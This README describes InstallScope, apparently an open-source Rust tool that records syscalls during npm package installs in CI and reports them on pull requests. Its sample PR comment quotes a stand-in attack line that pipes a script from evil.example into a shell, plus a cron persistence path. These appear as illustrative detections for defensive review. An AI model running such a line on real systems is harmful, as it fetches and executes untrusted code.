# InstallScope

[![rust](https://github.com/mukti-sys/InstallScope/actions/workflows/rust.yml/badge.svg)](https://github.com/mukti-sys/InstallScope/actions/workflows/rust.yml)
[![Phase 1 — recorder E2E](https://github.com/mukti-sys/InstallScope/actions/workflows/phase1-e2e.yml/badge.svg)](https://github.com/mukti-sys/InstallScope/actions/workflows/phase1-e2e.yml)
[![Phase 2 — aya backend parity](https://github.com/mukti-sys/InstallScope/actions/workflows/phase2-aya.yml/badge.svg)](https://github.com/mukti-sys/InstallScope/actions/workflows/phase2-aya.yml)
[![harness tests](https://github.com/mukti-sys/InstallScope/actions/workflows/harness-tests.yml/badge.svg)](https://github.com/mukti-sys/InstallScope/actions/workflows/harness-tests.yml)

> Attestations verify *who signed* it. InstallScope records *what it did*.

The flight recorder for package installs.

---

### What a maintainer sees on a PR:

> ### **InstallScope** · `100 / 100` (raw 220) · `npm install`
> 
> - **[CRITICAL]** wrote outside expected project/cache directories: `/etc/cron.d/persistence` (2 times)
> - **[CRITICAL]** piped downloaded remote payload to shell: `sh -c "curl -fsSL https://evil.example/stage2.sh | sh"`
> - **[HIGH]** contacted non-registry external IP during install: `198.51.100.42:4444`
> - *…and 8 more observed findings in full forensic trace*
> 
> <sup>[view full evidence report (.html) ↗] · [download SARIF ↗] · `events.jsonl` (sha256:e3b0c442...)</sup><br>
> <sup>Recorded with the strace engine (v1.0). Advisory: this comment reports observed install behaviors, and does not block the build.</sup>

---

## What is InstallScope?

When a pull request adds or updates a dependency, InstallScope captures the **syscall-level ground truth** of what that package's install scripts actually do — filesystem mutations, network sockets, DNS lookups, credential reads, and spawned processes — and posts an austere, single-page forensic report directly to the PR.

Package install scripts (`postinstall`, `preinstall`, `build.rs`) execute arbitrary code with full user privileges. `npm audit` only flags known CVEs against published advisory databases; static scanners inspect ASTs and package manifests before execution; container isolation tools add friction without producing structured review evidence.

InstallScope provides runtime behavioral observation designed specifically for CI pull request reviews.

---

## Quickstart & Evaluation

Evaluate an included forensic trace fixture without any Linux or kernel prerequisites:

### Linux & macOS (Terminal)

```bash
# 1. Clone the repository and enter the directory
git clone https://github.com/mukti-sys/InstallScope.git
cd InstallScope

# 2. Evaluate a sample recording against the deterministic rule catalog
cargo run -p installscope -- report corpus/demo/high.jsonl

# 3. Inspect the generated evidence report
cat installscope-report/installscope-comment.md
```

### Windows (PowerShell)

```powershell
# 1. Clone the repository and enter the directory
git clone https://github.com/mukti-sys/InstallScope.git
cd InstallScope

# 2. Evaluate a sample recording against the deterministic rule catalog
cargo run -p installscope -- report corpus/demo/high.jsonl

# 3. View the summary comment or open the dashboard in your default browser
Get-Content installscope-report\installscope-comment.md
Start-Process installscope-report\installscope-report.html
```

> **Windows Note:** In standard Command Prompt (`cmd.exe`), use `type installscope-report\installscope-comment.md` to display the file. Avoid chaining commands with `&&` in Windows PowerShell 5.1; run commands on separate lines or separate them with `;`.

---

## Installation & Platform Support

InstallScope can be installed via Cargo or downloaded as precompiled standalone binaries:

```bash
# Install from source via Cargo (cross-platform)
cargo install --git https://github.com/mukti-sys/InstallScope.git installscope
```

Prebuilt release binaries with SHA-256 checksums are available on [GitHub Releases](https://github.com/mukti-sys/InstallScope/releases):
- **Windows (x86_64):** `installscope-x86_64-pc-windows-msvc.zip` (`installscope.exe`)
- **Linux (x86_64):** `installscope-x86_64-unknown-linux-gnu.tar.gz` / `installscope-x86_64-unknown-linux-musl.tar.gz`
- **macOS (Apple Silicon & Intel):** `installscope-aarch64-apple-darwin.tar.gz` / `installscope-x86_64-apple-darwin.tar.gz`

### Platform Compatibility

| Capability | Linux | macOS | Windows | Windows (WSL2) |
|---|---|---|---|---|
| **Forensic Reporting (`report`)** | ✅ Native | ✅ Native | ✅ Native (`installscope.exe`) | ✅ Native |
| **Behavioral Diffing (`diff`)** | ✅ Native | ✅ Native | ✅ Native (`installscope.exe`) | ✅ Native |
| **Stream Verification (`verify`)** | ✅ Native | ✅ Native | ✅ Native (`installscope.exe`) | ✅ Native |
| **Lockfile Diffing (`lockfile-diff`)** | ✅ Native | ✅ Native | ✅ Native (`installscope.exe`) | ✅ Native |
| **Live Install Recording (`record`)** | ✅ `strace` / `aya` eBPF | 🔄 Linux Container | 🔄 WSL2 / Container | ✅ Native `strace` |

*Live recording intercepts kernel syscalls via `strace` or eBPF, which requires a Linux kernel. On Windows or macOS, run `installscope record` inside WSL2 or a container, or let the GitHub Action record automatically on Linux CI runners during pull requests.*

On Linux or WSL2, record any installation command live:

```bash
installscope record -- npm install
installscope verify events.jsonl
installscope report events.jsonl
```

---

## Landscape

Where InstallScope sits relative to existing tools:

| Category | Tool | CVE Knowledge | Manifest / AST Heuristics | Per-PR Syscall Evidence | Behavioral Version-Diff |
|---|---|---|---|---|---|
| **Advisory Scanners** | `npm audit` / `pip audit` | ✅ Known CVEs | ❌ None | ❌ None | ❌ None |
| **Static Analyzers** | Socket | Partial | ✅ Registry heuristics & AST | ❌ No runtime execution | ❌ Manifest diff only |
| **Runtime Detection** | Falco / Tracee | ❌ By design | ❌ By design | ✅ (Production daemon) | ❌ No PR/install diff |
| **Isolation** | firejail / bubblewrap | ❌ None | ❌ None | ❌ Enforcement primitive | ❌ No review report |
| **Flight Recorder** | **InstallScope** | ❌ Out of scope | ❌ Out of scope | ✅ **Deterministic syscall trace** | ✅ **Content-addressed diff** |

*Note: Falco and Tracee are production runtime monitors for long-running servers and Kubernetes nodes. InstallScope is specifically built for ephemeral CI runners to inspect pull requests before code merges.*

---

## The 840,069 Syscall Experiment

To establish an empirical baseline before release, we ran an automated backfill over **50 widely-used npm packages**, recording **250 complete installations** across **200 consecutive version pairs** on ephemeral GitHub Actions runners ([run #33632942704](https://github.com/mukti-sys/InstallScope/actions/runs/33632942704)):

- **100% Completion:** 250 verified recordings, 0 unhandled failures, 0 dropped trace streams.
- **840,069 Observations, 195,780 Distinct:** the first counts every behavior in every recording; the second counts how many *different* ones exist. The gap is `node_modules` and cache writes that every install performs, and the second number is the honest one for a claim about dataset size.
- **Reproducibility:** across 20 parallel runner environments, 200 version comparisons completed with **0 blocked comparisons** — meaning two recordings of the same package made at different times, in different directories, on different machines reduced to comparable behavior sets.

Every figure is computed from the stored recordings rather than from the plan, by `harness/corpus/summarize-corpus.mjs`. The run's `corpus` artifact contains `dataset.json` and `DATASET.md`, which are the primary source; the harness explicitly refuses to describe the list as "top N by downloads" because nothing in the pipeline establishes a download ranking.

### What we learned from empirical data:

1. **Network traffic is ubiquitous but static:** 1,023 external network connections and 500 credential reads occurred. **None of them differed between versions** of the same package — these were registry fetches and local `.npmrc` reads by `npm` itself.
2. **What actually changes across versions:** of 200 version transitions, 197 produced purely internal filesystem changes (`node_modules` structure). Only 3 produced new process spawns, all legitimate compiler toolchains in native packages (`bcrypt` introducing `node-gyp-build`, `sqlite3` invoking `prebuild-install`, `protobufjs` invoking `sh`).
3. **The lesson for PR review:** alert fatigue kills security tools. An install contacting `registry.npmjs.org` is normal; an install whose version bump suddenly introduces an unpinned request to an unknown host is a surprise. The version-diff engine surfaces the difference.

One caveat worth stating: 99.8% of those observations are filesystem writes, so conclusions about the network, process, and credential classes rest on hundreds of events rather than hundreds of thousands. And a 100% completion rate measured on well-behaved, widely-used packages does not predict the rate on a list chosen to include awkward ones.

---

## The Behavioral Version-Diff

InstallScope stores recordings in a content-addressed snapshot registry (SHA-256 addresses compressed with `zstd`). When a dependency updates from `v1.2.3` to `v1.2.4`, InstallScope calculates the behavioral diff:

```bash
installscope diff sqlite3 5.1.6 5.1.7
```

Output:
```markdown
# Behavioral Diff: sqlite3 (5.1.6 → 5.1.7)

## Added Behaviors
- `[SPAWN]` /bin/sh -c prebuild-install || node-gyp rebuild
- `[FS_WRITE]` /tmp/sqlite3-binding.node

## Removed Behaviors
- None
```

If a patch release touches no new domains, spawns no new processes, and writes only within `node_modules`, the report states that behavioral profile is identical to the baseline.

---

## GitHub Action Setup

InstallScope uses two separate workflows to maintain a strict security boundary:

1. **`installscope.yml` (`pull_request`)**: Runs on `ubuntu-latest` with a **read-only** token. It executes the package manager, records the syscalls under `strace`, verifies stream integrity, and uploads the evidence artifact.
2. **`installscope-comment.yml` (`workflow_run`)**: Runs only after recording finishes, with write permissions to post the PR comment. It inspects only the uploaded artifact and **never checks out or executes untrusted PR code**.

### 1. Recording Workflow

```yaml
# .github/workflows/installscope.yml
name: installscope
on:
  pull_request:
    paths: ["**/package-lock.json", "**/pnpm-lock.yaml"]

permissions:
  contents: read

jobs:
  record:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: mukti-sys/InstallScope/action/record@v0
        with:
          fail-above: "" # Leave empty for advisory comments; set integer (e.g. 70) to block PR
```

### 2. Comment Posting Workflow

```yaml
# .github/workflows/installscope-comment.yml
name: installscope-comment
on:
  workflow_run:
    workflows: ["installscope"]
    types: [completed]

permissions:
  pull-requests: write
  contents: read

jobs:
  comment:
    runs-on: ubuntu-latest
    if: github.event.workflow_run.conclusion == 'success'
    steps:
      - uses: actions/checkout@v4
      - uses: mukti-sys/InstallScope/action/comment@v0
```

---

## Backend Architecture

InstallScope provides two recording engines, compared against each other by an automated parity suite:

```
                  ┌────────────────────────────────────────┐
                  │          installscope record           │
                  └───────────────────┬────────────────────┘
                                      │
                 ┌────────────────────┴────────────────────┐
                 ▼                                         ▼
   ┌───────────────────────────┐             ┌───────────────────────────┐
   │      strace Backend       │             │     aya eBPF Backend      │
   │          (v1.0)           │             │          (v1.1)           │
   ├───────────────────────────┤             ├───────────────────────────┤
   │ • Default for CI & Action │             │ • In-kernel ring tracing  │
   │ • Needs only ptrace       │             │ • 22 tracepoint programs  │
   │ • Kernel-resolved paths   │             │ • No per-syscall stop     │
   │ • Process tree kill on TO │             │ • Needs root (CAP_BPF)    │
   └───────────────────────────┘             └───────────────────────────┘
```

- **`strace` (v1.0 - Default)**: The engine the GitHub Action uses. Traces a fixed syscall set with `-f -ff -yy -ttt`, resolving file descriptors to the kernel's own absolute paths and socket connections to remote addresses. Terminates entire untrusted process trees via process group signaling (`SIGTERM` → 2s grace → `SIGKILL -<pgid>`). Needs no privilege beyond `ptrace`, which is why it is the default and the permanent fallback.
- **`aya` eBPF (v1.1 - Optional)**: In-kernel tracepoint backend in pure Rust. 22 programs, filtered to the recorded process tree in-kernel via `sched_process_fork` so a CI recording does not also capture the runner's own daemons. First verified in [run #33417231156](https://github.com/mukti-sys/InstallScope/actions/runs/33417231156) (parity OK: 29 shared facts, 40 differences, 0 unexplained), and re-verified by `phase2-aya.yml` on every commit touching the probes, the loader, or their shared ABI. Requires root to load BPF programs, so the Action does not use it.
- **Overhead**: eBPF avoids the per-syscall ptrace stop that `strace` incurs, which is why it exists. It is not free — probe execution, map lookups, and perf-buffer delivery all cost — and neither backend has been benchmarked against an untraced install. Treat the difference as directional rather than measured.
- **Coverage is not equal between them.** The aya probes are scoped to filesystem writes, network connects, and process spawns ([`Phases.md`:23](#)), so they record **no credential reads and no DNS queries at all**. A zero score from an aya recording is a weaker claim than a zero from strace, and every report states which backend produced it along with a per-class coverage table. The two are not interchangeable.
- **Process Spawn Parity**: The backends hook execution at slightly different kernel boundaries (shebang script execution vs binary interpreter invocation), so cross-backend spawn parity is classified as best-effort in `parity.rs`.
- **False-Positive Discipline**: Paths the recorder could not resolve to an absolute location are counted and shown, but deliberately not scored as outside-zone — guessing there would manufacture critical findings.

---

## The CLI Commands

| Command | Purpose |
|---|---|
| `installscope record -- <cmd>` | Execute and record an install command into `events.jsonl` |
| `installscope verify <file>` | Validate event stream integrity; returns exit code 3 on `PARTIAL` |
| `installscope report <file>` | Score recording against the rule catalog → emits SARIF, HTML, and Markdown |
| `installscope report --rules <file>` | Score against a catalog you supply instead of the embedded one |
| `installscope lockfile-diff` | Inspect `package-lock.json` or `pnpm-lock.yaml` to detect install script triggers |
| `installscope snapshot push` | Store a verified event stream in the content-addressed registry |
| `installscope snapshot verify` | Re-verify content addresses and hashes of all stored snapshots |
| `installscope diff <pkg> <a> <b>` | Compute behavioral differences between two recorded package versions |
| `installscope parity` | Run parity comparison between `strace` and `aya` trace streams |

---

## Testing & Verification

The test suite enforces zero-warning compliance across all crates:

```bash
# Run unit & integration tests
cargo test --workspace

# Strict clippy linting
cargo clippy --workspace --all-targets -- -D warnings

# Format check
cargo fmt --check

# Run golden test harnesses
node harness/corpus/test-corpus.mjs
node harness/g2/test-parse.mjs
```

Counts, per-crate breakdowns, and — more usefully — an explicit table of **what a local run cannot cover** are in [TESTS.md](TESTS.md), which is generated by `node scripts/test-log.mjs` and fails CI if it goes stale. A count typed by hand is wrong as soon as the next test lands.

---

## Community & Good First Issues

We welcome contributions from systems and security engineers. Three starter issues are ready:

1. **Community Rules (`rules/catalog.yaml`):** The catalog is loadable at runtime via `report --rules <path>`, so a new host list or severity can be proposed and tested without touching Rust. The gap most worth closing: a rule for writes to shell-init and persistence paths inside the home directory, which the zone model currently treats as expected.
2. **Lockfile Support:** Extend `lockfile/` to parse Yarn Berry (v2+) `yarn.lock`. The npm v1–v3 and pnpm v5–v9 parsers with their fixture suites are the pattern to follow.
3. **Recorder Coverage:** Trace `bind`, `listen`, and `accept`. A package that opens a listening port currently produces no event at all — see the coverage table any report prints. This needs a new event shape in the schema rather than just another syscall name, which makes it a good way to learn the whole pipeline.

---

## License

Dual-licensed under either:

- [Apache License, Version 2.0](LICENSE-APACHE)
- [MIT License](LICENSE-MIT)

at your option.
